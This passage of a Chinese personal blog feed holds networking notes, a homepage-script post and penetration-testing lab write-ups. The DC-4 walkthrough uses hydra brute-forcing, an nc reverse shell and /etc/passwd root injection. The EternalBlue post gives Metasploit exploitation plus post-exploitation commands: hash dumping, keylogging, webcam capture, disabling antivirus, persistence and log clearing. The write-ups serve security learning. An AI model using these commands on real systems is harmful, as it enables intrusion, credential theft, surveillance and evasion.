<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">如：10.2.1.1 、 192.168.1.1</span><br></pre></td></tr></tbody></table></figure>
<h1>0x02 子网掩码</h1>
<ol>
<li><strong>局域网通信规则</strong>：在同一局域网中，所有的IP必须在同一网段中才可以互相通信</li>
<li><strong>IP地址构成</strong>：网络位+主机位（网络位相同的IP地址，属于同一网段）</li>
<li><strong>子网掩码</strong>：每一个IP地址必须配一个子网掩码，用来确定IP地址的网络位</li>
</ol>
<p><strong>子网掩码如何确定网络位</strong>：与<strong>255</strong>对应的数字为<strong>网络位</strong>，与<strong>0</strong>对应的数字为<strong>主机位</strong></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">255.0.0.0  、 255.255.0.0  、 255.255.255.0</span><br><span class="line">PLAINTEXT</span><br><span class="line">如：</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.0.0.0</span><br><span class="line">则10.1.1.1属于10.0.0.0这个网段，主机名字叫1.1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.0.0</span><br><span class="line">则10.1.1.1属于10.1.0.0这个网段，主机名字叫1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.255.0</span><br><span class="line">则10.1.1.1属于10.1.1.0这个网段，主机名字叫1</span><br></pre></td></tr></tbody></table></figure>
<h1>0x03 IP地址详解</h1>
<p>IP地址分为五大类（以IP地址的第一位进行区分）</p>
<ul>
<li><strong>A类</strong>： <strong>1-126</strong> 默认子网掩码：255.0.0.0</li>
<li><strong>B类</strong>：<strong>128-191</strong> 默认子网掩码：255.255.0.0</li>
<li><strong>C类</strong>：<strong>192-223</strong> 默认子网掩码：255.255.255.0</li>
<li><strong>D类</strong>：<strong>224-239</strong> 组播地址</li>
<li><strong>E类</strong>：<strong>240-254</strong> 科研使用</li>
</ul>
<p>注：</p>
<p>1、目前我们可以使用的只有A、B、C 三类</p>
<p>2、A、B、C 三类的子网掩码可以修改</p>
<h2 id="3-1-127开头">3.1 127开头</h2>
<p>这个开头只有一个地址：**127.0.0.1：**本地回环地址（永远代表自己）</p>
<p>Ping这个地址代表跟自己通信（Ping它等于Ping自己）</p>
<h2 id="3-2-广播地址">3.2 广播地址</h2>
<p>主机位上全为255即为广播地址</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">如：</span><br><span class="line">10.1.1.1  255.255.0.0</span><br><span class="line">这个IP属于10.1.0.0这个网段，那么把主机位、或者说0这个位置全都换成255就是广播地址:10.1.255.255就是这个IP的广播地址</span><br></pre></td></tr></tbody></table></figure>
<h1>0x04 网关</h1>
<p><strong>网关（Gateway）</strong>：网络的出口，可以使不在同一个网段的IP通信，一般在路由器上</p>
<p>通俗来讲就是访问互联网的通道</p>
<p>路由器：可用连接内外网的设备</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">主机与主机之间互相通信:</span><br><span class="line">	首先判断目标IP地址与自己是否处在同一网段</span><br><span class="line">	若在同一网段，则直接发出去，而不找网关</span><br><span class="line">	若不在同一网段，则直接发包给网关</span><br></pre></td></tr></tbody></table></figure>
<h1>0x05 DNS</h1>
<p>DNS：Domain Name Service 域名服务</p>
<p>用于<strong>解析网站域名</strong></p>
<p>通过浏览器使用域名访问互联网：</p>
<ul>
<li>浏览器会先找是否有本地缓存（也就是之前是否访问过该网站）</li>
<li>接着会找位于 C 盘的本地解析文件（host文件）</li>
<li>本地没有的话，浏览器会向DNS服务器发起解析请求</li>
</ul>
<p>若直接访问 IP 地址的话则不需要DNS服务</p>
<p>通过命令</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></tbody></table></figure>
<p>可以查询该网址的 IP 地址以及帮你进行解析的 DNS</p>
<p><a href="https://cgrona.top/2022/01/09/study/1.png"><img src="https://cgrona.vercel.app/2022/01/09/study/1.png" alt="img"></a></p>
<h1>0x06 网络测试命令</h1>
<ul>
<li>
<p>如何查看IP地址</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ipconfig # 查看IP地址基本信息</span><br><span class="line">ipconfig /all # 查看IP地址详细信息</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>测试网络连通性</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ping 目标IP地址 # 测试网络连通性，有回复即为可以成功通信</span><br><span class="line">ping -t 目标IP地址 # 一直ping</span><br><span class="line">ping -n 目标IP地址 # 修改ping包的数量</span><br><span class="line"></span><br><span class="line">注:若ping不通，可能对方不在线，或者对方开着防火墙</span><br></pre></td></tr></tbody></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>转载</category>
      </categories>
  </entry>
  <entry>
    <title>VulnHub——DC-1靶机学习记录</title>
    <url>/2022/09/24/dc1/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="84e5950b4f6928370c633f0f1a1812ee8067963b5a6d847c60c774e437edb9fb">bed7a276ba7847d76277538a14c701d513208fcd9bec01ee5395d46614c8a8d77a7487d3838d985e6244ba9499c43727f0817a7c1d48622c8c2bfb7b6a8aba9bebac452a3380872edb394f4ce5260c0b543356768910e99ec6ced4db139df77114896906cb314cd3d31b36bd2e2976fdaf780288d9be00c3207d30101f1ba4c6f0247443ff05f8fa65f91ea64bda0236e442d53cd761dd272e7adda3365808d99fe2c4ce47eb10db32512dc5eaa5efc39976d5e25393539c4d229126208ff59e2f615950e2aefdd8cbc9f76f06e5e19194ad1b525da4b6b98b49926d2f2eadfdf5194511986954bdff328871779b0cc3cc29726bf67cd4edba7dd4255f4a85807fea077ae7864bd950ceae3e55754fb9e7c7ec1314910fb83de0555b86db174ef824a5f8bb31f5dca1526a2b87c71ec7552ee2315a43200aa81a2adb5c8b8e0f6e1eac168c661f47c022ba89ad53cfd7ad21bdf518191e7c4bfa96de18129935da0781be88c84f6e97ce0269827eab9d6a08637ec05b52fbb34b67fc559fff245868ab8078132a6a60992a6442e0b411797a40210b2a47780649dc235bb06738b3f985a16fc31899f08c61b8a28e3ad4f8ac24c49c6885a597ff0e19513152d799b8588e23bca1659877a692363826a0ec08eed5306ae1a75befa4238c00283cdb3ab6d0f4a271ed814c2717e922325c27289dccea8d3a40699f71da3d13ecd90f833910705db6f4839585c25f2249a9d659ca01ff137c03e4672114165e380f391272148d6a652204e71d1f0b4be43c9a0aeebacd4baf7605777c8db316d2b2d76b1948fb821ae5edc3a799142616788d1df1ae847432bb2fd382176d6f1d5d833568aeaea6461b5a2aa47cda200425f2de7944a898576a6603a880137e300b8a229734e593d710738521e8c66804853557ba6a6804b3f09a8633a590887abcf827d2f4e0b44c676a1f37404bcdd5d27bf550b5f78d29eb8718bb51f74577511cfd8ad9ad556af306e49195f2d49eaf474c027084376ce24c0caddf9b7d14d24b8c08651451e0732cf38d1635bb27dd7591a830a795dbf2df83a71e594e6d113cb3745ef89696c7b566af22b7c356cae5f5768f56ba5ee64760b5d820194656db02bc7602d9920025f8cc09d0a58480661a3acee7f6b80f2d9a6bfe08f14e4b69826177422737797526c8adc69efb376865edaa30243adf7a808f04f0d9e008a6f5ae66bdca6ea3f27f4ddc03c15c54920dc3043eb92c3a2c61f282adf2f3371786962eb6fa317f998e59182ce386737ddd634d5b1e2bbce14fdedf0dc993bb3f1f0662cdd85dfadcbb8e510b598493551c1666ead6699efaec42267c286db3b9c13a40dc945cf3371f8e628b13154db51e50af08449fcd2bc6357beda3a5d9ea1fcd964b14761300f8a7e07365a8f1fd1b23f1f48b80d46f3cc96c0645449bdf150b45cde74bccd47928c28ec0da119ed6a35f42915a1980ccf7f449b4adea3d87a6995258575efb74d816406b114a5c6ee74a6aec213cf578b51138512581c1f5dcfd0bd584177184baa719032caad013e56e4f4550e63fa14bd09efb530a3e2d44dfcf2a01bbe7585b26df429f07d06cd5132ba9f368a7c1d8c86e343a7c394da3e5a885d9eff6740587f2ee51a3653187f8b270e9c741e23bc7a8094fd5fffa926d4c3e4142e10dbab272a062b733587f2984abf0409bbf1dad8958db9a24cf882fc3080c67cc4ff86c2bd8d0772d1fb4c89380d193426d8f80779502ffc6df0baac10d0e36bc0cfcf17f2781e1f9e17f82125b219409448864574a51dcf9505985f9e8ba9512aa10badfcf5d0bf2f0439708ecbc93465ef6b7e11db5da201504ca9384141fad3901e25352412ad59cfbf9b6b37f9b87b10588f114e24dc32cdaa8f850ddbcc2566c2a6968e192414b5ef5a80a87c4e5771fbd4f1dd790cbd71eb743442760b677d7366d21907d868482e9bb246119ba4e9fb3f2259a164f27713e51a6f3de0064b5a2c0abb42d2bcc93ea64508b7d3f338e76a7b3431aa6f6c9f26939b42b4783d171d47c669db0f23af6f29607616b866fd32c1f7c4ff9d41ac03c2b8b4f54e93a03fcfc48effd84de5a09336edc589cfd8da472868f5a48ec8e70162f30b2f0e320f072ff84f8af21d6fb68f4e5be3f6d576d1132233451cc35755cefb2441fbf436b069bab7987882aba78f4e8f38da3ec658b972d495c658eec1dfe67dc1d58aabd05e4fe4e0208c66d27b89f5848db0c88c6cb8b64d701c35b0308ab841b1d4ba92a26cff3f4c038833a9d63e602f3518b2516fc753380fc845bb04db15e9e620fd5a6bd690369ddd1b58b22da1d78e6d56d8e89d763f8fd481649d5f90ab2bb497c7149</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-up">
      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-up">加密文章，请输入密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub——DC-4靶机学习记录</title>
    <url>/2022/07/25/dc4/</url>
    <content><![CDATA[<h1>关于DC-4</h1>
<blockquote>
<p>DC-4是另一个专门构建的易受攻击的实验室，旨在获得渗透测试领域的经验。</p>
<p>与以前的DC版本不同，此版本主要为初学者/中级版本而设计。只有一个标志，但从技术上讲，有多个入口点，就像上次一样，没有线索。</p>
<p>Linux技能和对Linux命令行的熟悉程度是必须的，基本的渗透测试工具的一些经验也是必须的。</p>
<p>对于初学者来说，Google可以提供很大的帮助，但你可以随时在@DCAU7上发推文给我，寻求帮助，让你再次前进。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p>
</blockquote>
<table>
<thead>
<tr>
<th>名称</th>
<th>DC- 4</th>
</tr>
</thead>
<tbody>
<tr>
<td>发布日期</td>
<td>2019年4月7日</td>
</tr>
<tr>
<td>作者</td>
<td>DCAU</td>
</tr>
<tr>
<td>系列</td>
<td>DC</td>
</tr>
<tr>
<td>网页</td>
<td><a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></td>
</tr>
</tbody>
</table>
<h1>环境</h1>
<p>靶机：DC-4（IP:未知）</p>
<p>攻击机：KALI（IP:192.168.3.96）</p>
<p>平台：VMware 16.2.4</p>
<h1>信息收集</h1>
<p><strong>主机发现</strong></p>
<p><code>arp-scan -l</code></p>
<p><img src="https://img.anineg.space/scan1.png" alt="scan1"></p>
<p><strong>使用nmap进行扫描主机</strong></p>
<p><code>nmap -sS -Pn -A -p- -n 192.168.3.95</code></p>
<p><img src="https://img.anineg.space/nmapss.png" alt="nmapss"></p>
<p><code>nmap -sV -p- 192.168.3.95</code></p>
<p><img src="https://img.anineg.space/nmapsv.png" alt="nmapsv"></p>
<p><strong>web指纹识别</strong></p>
<p><code>whatweb -v 192.168.3.95</code></p>
<p><img src="https://img.anineg.space/whatweb.png" alt="whatweb"></p>
<p><strong>网站目录扫描</strong></p>
<p><code>dirb http://192.168.3.95 /usr/share/dirb/wordlists/big.txt</code></p>
<p><img src="https://img.anineg.space/dirb.png" alt="dirb"></p>
<h2 id="收集到的信息：">收集到的信息：</h2>
<ul>
<li>
<p>靶机IP =&gt; 192.168.3.95</p>
</li>
<li>
<p>开放的端口：</p>
<ul>
<li>22 =&gt; ssh服务 ---- OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</li>
<li>80 =&gt; http服务 ---- nginx 1.15.10</li>
</ul>
<hr>
</li>
</ul>
<h1>渗透测试</h1>
<p>尝试用hydra进行爆破</p>
<p><code>hydra -l root -P /root/top1000.txt -vV -t 10 -o ssh.txt 192.168.15.152 ssh -s 22</code></p>
<p><img src="https://img.anineg.space/hydra1.png" alt="hydra1"></p>
<p>爆不出来，先去网页端看一看有什么有用的信息。</p>
<p>访问<code>http://192.168.3.95/</code></p>
<p><img src="https://img.anineg.space/0010.png" alt="0010"></p>
<p>打开网页，是一个登录界面，开始用BP进行爆破，得到密码：</p>
<blockquote>
<p>happy</p>
</blockquote>
<p><img src="https://img.anineg.space/baopo.png" alt="baopo"></p>
<p>登录进入，发现有可以执行命令的地方：</p>
<p><img src="https://img.anineg.space/login.png" alt="login"></p>
<p><img src="https://img.anineg.space/run.png" alt="run"></p>
<p>使用BP进行抓包，发现可以修改命令：</p>
<p><img src="https://img.anineg.space/bp1.png" alt="bp1"></p>
<p><img src="https://img.anineg.space/bp2.png" alt="bp2"></p>
<p><img src="https://img.anineg.space/fire1.png" alt="fire1"></p>
<p>先执行一个反弹shell的命令：<code>nc -e /bin/bash 192.168.3.95 4444</code></p>
<p>执行之前现在kali上监听4444端口：<code>nc -lnvp 4444</code></p>
<p><img src="https://img.anineg.space/listen.png" alt="listen"></p>
<p><img src="https://img.anineg.space/bp4.png" alt="bp4"></p>
<p>getshell成功：</p>
<p><img src="https://img.anineg.space/ncsuccess.png" alt="ncsuccess"></p>
<p>进入交互模式，便于操作：<code>python -c 'import pty;pty.spawn("/bin/sh")'</code></p>
<p>先搜刮一下目录：</p>
<p><img src="https://img.anineg.space/jim.png" alt="jim"></p>
<p>查看jim用户下的backups，发现确实是密码的备份，cat打开进行查看，确实是密码。</p>
<p><img src="https://img.anineg.space/bak.png" alt="bak"></p>
<p>看看其他文件，mbox访问被拒绝：</p>
<p><img src="https://img.anineg.space/catother.png" alt="catother"></p>
<p>把密码copy到本地，用 hydra进行爆破：</p>
<p><code>hydra -l jim -P /home/kali/桌面/bak.txt ssh://192.168.3.95</code></p>
<p><img src="https://img.anineg.space/hydrasuccess.png" alt="hydrasuccess"></p>
<p>得到密码：</p>
<blockquote>
<p>jibril04</p>
</blockquote>
<p>使用ssh远程登陆：</p>
<p><img src="https://img.anineg.space/sshin1.jpg" alt="sshin1"></p>
<p>注意系统提示有新的邮件。</p>
<p>找到邮件，发现 charles用户交给 jim用户保管的密码：</p>
<p><img src="https://img.anineg.space/cdmail.png" alt="cdmail"></p>
<p><img src="https://img.anineg.space/jimmail.png" alt="jimmail"></p>
<p>得到用户名和密码：</p>
<blockquote>
<p>charles</p>
<p>^xHhA&amp;hvim0y</p>
</blockquote>
<p>再次使用ssh远程登陆到charles ：</p>
<p><img src="https://img.anineg.space/sshin2.png" alt="sshin2"></p>
<p>查看用户权限发现，该用户可以以root权限免密码执行 /usr/bin/teehee</p>
<p>进行提权，直接向/etc/passwd中增加内容：</p>
<p>echo 命令与 sudo 命令配合使用，可以实现向那些只有系统管理员才有权限操作的文件中写入信息</p>
<p>添加一个 hack用户，并使用teehee执行写入passwd中</p>
<p><code>echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd</code></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">参数解释：</span><br><span class="line">admin:x:0:0::/home/admin:/bin/bash</span><br><span class="line">[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span><br><span class="line">"-a" 选项的作用等同于 "&gt;&gt;" 命令</span><br></pre></td></tr></tbody></table></figure>
<p><img src="https://img.anineg.space/image-20220725223345603.png" alt="image-20220725223345603"></p>
<p>得到flag：<img src="https://img.anineg.space/flag.png" alt="flag"></p>
<details class="folding-tag" cyan="" close=""><summary> 参考文章： </summary>
              <div class="content">
              <div class="tag link"><a class="link-card" title="菜鸟渗透日记24---DC-4靶机打靶过程详解" href="https://blog.csdn.net/leesir98/article/details/101620077"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">菜鸟渗透日记24---DC-4靶机打靶过程详解</p><p class="url">https://blog.csdn.net/leesir98/article/details/101620077</p></div></a></div><div class="tag link"><a class="link-card" title="DC-4靶机渗透指南（渗透测试详细操作）" href="https://blog.csdn.net/weixin_45671944/article/details/121747512"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">DC-4靶机渗透指南（渗透测试详细操作）</p><p class="url">https://blog.csdn.net/weixin_45671944/article/details/121747512</p></div></a></div><div class="tag link"><a class="link-card" title="【vulnhub】---DC-4靶机" href="https://blog.csdn.net/qq_43168364/article/details/106626917"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">【vulnhub】---DC-4靶机</p><p class="url">https://blog.csdn.net/qq_43168364/article/details/106626917</p></div></a></div>
              </div>
            </details>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>永恒之蓝漏洞复现</title>
    <url>/2022/04/21/eternalblue/</url>
    <content><![CDATA[<h1>漏洞描述：</h1>
<p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
<h1>影响版本：</h1>
<p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
<h1>复现环境：</h1>
<p>攻击机：Linux Kali （192.168.8.242）</p>
<p>靶机：Windows7 x64 （192.168.8.172）</p>
<h1>复现过程：</h1>
<h2 id="主机发现">主机发现</h2>
<p>用nmap探测本网段存活主机 <code>nmap 192.168.8.17</code></p>
<p><img src="https://img.anineg.space/1.png" alt="1"></p>
<p>探测到存活主机ip，并探测到开放445端口，而永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞。</p>
<h2 id="进入MSF框架">进入MSF框架</h2>
<p>执行<code>msfconsole</code></p>
<p><img src="https://img.anineg.space/2.png" alt="2"></p>
<p>ms17-010代码 msf6 &gt; <code>search ms17_010</code></p>
<p><img src="https://img.anineg.space/3.png" alt="3"></p>
<p>在这里可以看到两个工具，其中auxiliary/scanner/smb/smb_ms17_010是永恒之蓝扫描模块,探测主机是否存在MS17_010漏洞，exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码，前者扫描漏洞，后者进行攻击。</p>
<h2 id="使用ms17-010扫描模块">使用ms17-010扫描模块</h2>
<p>msf6 &gt; <code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
<p>查看模块需要配置的参数  <code>show options  </code></p>
<p><img src="https://img.anineg.space/4.png" alt="4"></p>
<p>在Required一栏中显示yes的需要填写Current Setting项</p>
<p>如 <code>set rhosts 192.168.8.172</code></p>
<p>执行扫描 <code>run</code></p>
<p><img src="https://img.anineg.space/5.png" alt="5"></p>
<p>显示可能存有永恒之蓝漏洞。</p>
<h2 id="使用ms17-010攻击模块">使用ms17-010攻击模块</h2>
<p>msf6 &gt; <code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
<p>查看模块需要配置的参数  <code>show options  </code></p>
<p><img src="https://img.anineg.space/6.png" alt="6"></p>
<p>同理，设置目标IP ：<code>set rhosts 192.168.8.172</code></p>
<p>设置用于接收从目标机弹回来的shell：<code>set  LHOST 192.168.1.11</code></p>
<p>执行攻击 <code>run</code></p>
<p><img src="https://img.anineg.space/7.png" alt="7"></p>
<center>攻击成功！</center>
<hr>
<h2 id="后渗透阶段">后渗透阶段</h2>
<p>使用<code>shell</code>可以进入被攻击机的Windows shell，但会有乱码。使用<code>chcp 65001</code>，改变代码页（65001为UTF-8的代码页）即恢复正常。</p>
<p><img src="https://img.anineg.space/8.png" alt="8"></p>
<p>使用<code>screenshot</code>进行截屏</p>
<p><img src="https://img.anineg.space/9.png" alt="9"></p>
<p>想从目标主机shell退出到 meterpreter ，输入：<code>exit</code></p>
<p>要想从 meterpreter 退出到MSF框架，输入：<code>background</code></p>
<h2 id="更多操作">更多操作</h2>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程</span><br><span class="line">PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run  killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run				             #使用扩展库</span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接</span><br><span class="line">                                   192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line">clearev                       #清除日志</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">run post/windows/manage/migrate                  #自动进程迁移     </span><br><span class="line">run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上     </span><br><span class="line">run post/windows/manage/killav                   #关闭杀毒软件     </span><br><span class="line">run post/windows/manage/enable_rdp               #开启远程桌面服务     </span><br><span class="line">run post/windows/manage/autoroute                #查看路由信息     </span><br><span class="line">run post/windows/gather/enum_logged_on_users     #列举当前登录的用户     </span><br><span class="line">run post/windows/gather/enum_applications        #列举应用程序     </span><br><span class="line">run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码     </span><br><span class="line">run windows/gather/smart_hashdump                #dump出所有用户的hash</span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>渗透</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>主页源码修改记录（简单网页倒计时+跳转+文本替换）</title>
    <url>/2023/04/14/indexcode/</url>
    <content><![CDATA[<h1>网站模板</h1>
<p>我的主页<a href="https://anineg.space/">ANINEGの小屋</a>模板是使用的来自<a href="https://html5up.net/">https://html5up.net</a>的免费模板，以下是网页的介绍：</p>
<ul>
<li>Fully <strong>Responsive</strong></li>
<li>Built on intelligent <strong>HTML5 + CSS3</strong></li>
<li>Super <strong>Customizable</strong></li>
<li><strong>100% Free</strong> under the <a href="https://html5up.net/license">Creative Commons</a></li>
</ul>
<p>有需要的同学们可以去自行下载。</p>
<p><img src="https://img.anineg.space/myindex.png" alt=""></p>
<h1>源码修改</h1>
<p>在原有模板的基础上，我增添了如下功能：</p>
<ol>
<li>它会在页面上显示10秒倒计时，结束后后自动跳转到博客页。</li>
<li>在倒计时这10秒中可以对博客网页进行预加载。</li>
<li>当用户单击网页任何位置时，倒计时停止，并将显示倒计时的文本替换为“欢迎访问ANINEG的小屋”</li>
</ol>
<p>以下是实现过程：</p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> preloadUrl = <span class="string">"https://blog.anineg.space/"</span>; <span class="comment">// 需要预加载的页面地址</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">"iframe"</span>); <span class="comment">// 创建一个iframe元素</span></span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">style</span>.<span class="property">display</span> = <span class="string">"none"</span>; <span class="comment">// 将iframe元素隐藏</span></span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">src</span> = preloadUrl; <span class="comment">// 设置预加载页面的地址</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe); <span class="comment">// 将iframe元素添加到body中，开始预加载</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> count = <span class="number">13</span>; <span class="comment">// 设置倒计时时间</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> intervalId = <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">        count--;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown"</span>).<span class="property">innerHTML</span> = count; <span class="comment">// 更新倒计时数字</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (count &lt;= <span class="number">0</span>) {</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">clearInterval</span>(intervalId); <span class="comment">// 清除计时器</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown-text"</span>).<span class="property">innerHTML</span> = <span class="string">"欢迎访问ANINEG的小屋"</span>; <span class="comment">// 替换倒计时提示为“欢迎访问”</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">"https://blog.anineg.space/"</span>; <span class="comment">// 跳转到下一个页面</span></span></span><br><span class="line"><span class="language-javascript">        }</span></span><br><span class="line"><span class="language-javascript">    }, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">"click"</span>, <span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">clearInterval</span>(intervalId); <span class="comment">// 清除计时器</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown-text"</span>).<span class="property">innerHTML</span> = <span class="string">"欢迎访问ANINEG的小屋"</span>; <span class="comment">// 替换倒计时提示为“欢迎访问”</span></span></span><br><span class="line"><span class="language-javascript">    });</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"countdown-text"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"countdown"</span>&gt;</span>13<span class="tag">&lt;/<span class="name">span</span>&gt;</span> 秒后自动前往博客页···<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>实际上，该模板的入场动画大概耗费3秒左右，因此需要10秒自动跳转的效果就需要将预设调为13秒。</p>
<p>在预加载部分，在倒计时开始时，使用JavaScript动态创建一个<code>&lt;iframe&gt;</code>元素，并将需要预加载的页面设置为该<code>&lt;iframe&gt;</code>的<code>src</code>属性。这样，浏览器就会在倒计时期间开始预加载该页面，从而提高用户体验。</p>
<p>接着，我们创建了一个计时器，每秒减少计数器变量<code>count</code>的值，并更新页面上的倒计时数字。当<code>count</code>的值减少到0时，清除计时器并跳转到下一个页面。最后，在页面上添加了一个事件监听器，当用户单击页面上的任何位置时，清除计时器，停止倒计时。</p>
